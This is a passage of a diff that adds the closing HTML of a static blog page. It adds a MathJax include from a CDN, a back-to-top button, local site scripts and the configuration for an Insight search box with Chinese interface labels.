+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {matchFontHeight: false},
+        SVG: {matchFontHeight: false},
+        CommonHTML: {matchFontHeight: false}
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
